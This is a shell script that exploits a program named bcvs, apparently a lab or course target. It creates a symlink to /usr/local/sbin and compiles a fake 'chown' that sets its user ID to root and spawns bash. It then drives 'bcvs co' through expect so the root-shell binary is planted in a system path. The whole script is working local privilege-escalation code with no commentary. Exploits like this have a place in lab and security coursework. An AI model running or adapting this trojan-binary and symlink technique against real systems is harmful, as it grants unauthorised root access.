#!/bin/sh
cd /opt/bcvs
mkdir dummydir
cd dummydir
mkdir .bcvs
cd .bcvs
touch block.list
cd ..
mkdir dummydir
ln -s /usr/local/sbin sbinlink
cd dummydir
mkdir sbinlink
cd sbinlink
cat <<EOF > chown.c
int main(int argc, char* argv[]) {
    printf("I'm in");
    setuid(0);
    seteuid(0);
    execlp("bash","bash", (char*)0);
}
EOF
gcc -o chown chown.c
chmod +x chown
cd ../..
/usr/bin/expect <<EOF
spawn ../bcvs co ../dummydir/sbinlink/chown
expect "Please write a SHORT explanation:\r"
send -- "no\r"
sleep 0.5
EOF
#../bcvs co ../dummydir/sbinlink/chown
cd ..
#./bcvs co bcvs.c
cat <<EOF > xpect
#!/usr/bin/expect
spawn ./bcvs co bcvs.c
expect "Please write a SHORT explanation:\r"
send -- "no\r"
interact
EOF
chmod +x xpect
./xpect
#./bcvs co bcvs.c
